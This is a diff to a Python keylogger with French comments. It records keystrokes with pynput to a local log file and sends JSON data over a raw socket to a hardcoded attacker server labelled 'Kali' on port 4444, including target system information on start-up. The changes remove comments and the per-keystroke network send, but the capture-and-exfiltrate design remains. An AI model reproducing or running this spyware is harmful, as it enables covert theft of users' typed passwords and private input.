@@ -1,9 +1,9 @@
 from pynput.keyboard import Listener
 import socket
 import json
-import platform  # Pour récupérer des informations sur l'OS
-import socket as s  # Pour récupérer le hostname
-import os  # Pour gérer les fichiers
+import platform
+import socket as s 
+import os
 
 # Adresse et port du serveur (Kali)
 SERVER_IP = "192.168.196.1"
@@ -12,7 +12,6 @@ SERVER_PORT = 4444
 # Fichier pour sauvegarder les frappes
 LOG_FILE = "keylogs.txt" 
 
-# Assure que le fichier existe (ou le crée) cc
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w") as f:
         f.write("=== Keylogger Logs ===\n\n")
@@ -22,7 +21,7 @@ def send_data(data):
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect((SERVER_IP, SERVER_PORT))
-        # Préparer les données en format JSON
+
         payload = json.dumps(data)
         client_socket.send(payload.encode('utf-8'))
         client_socket.close()
@@ -44,20 +43,12 @@ def send_target_info():
 
 # Fonction pour capturer les frappes de clavier
 def log_keystroke(key):
-    key = str(key).replace("'", "")  # Nettoyer les caractères
+    key = str(key).replace("'", "") 
 
     # Sauvegarder dans le fichier
     with open(LOG_FILE, "a") as f:
         f.write(f"{key}\n")
 
-    # Préparer les données pour l'envoi au serveur
-    keystroke_data = {
-        "type": "keystroke",
-        "data": key,
-    }
-    send_data(keystroke_data)
-
-# Envoi des informations sur la cible
 send_target_info()
 
 # Lancer l'écouteur pour les frappes clavier
